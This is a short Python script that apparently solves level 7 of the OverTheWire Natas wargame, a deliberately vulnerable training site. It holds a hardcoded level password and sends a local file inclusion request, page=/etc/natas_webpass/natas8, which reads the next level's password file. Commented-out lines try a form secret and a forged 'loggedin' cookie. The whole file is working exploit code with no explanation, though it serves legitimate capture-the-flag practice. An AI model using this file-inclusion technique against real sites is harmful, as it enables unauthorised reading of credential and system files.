#!/usr/bin/env python3

import requests, re

match = "natas"
username = "natas7"
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = "http://%s.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" % username


response = requests.post(url, auth= (username, password))
#response = requests.post(url, auth= (username, password), data = { "secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit" })
print(response.text)

# cookies = { "loggedin" : "1" }
# response = requests.post(url, auth= (username, password), cookies = cookies )
# pagecookies = response.cookies.get_dict()
# print(f"The cookies: {pagecookies}\n") 
# print("The page: \n")
# print(response.text)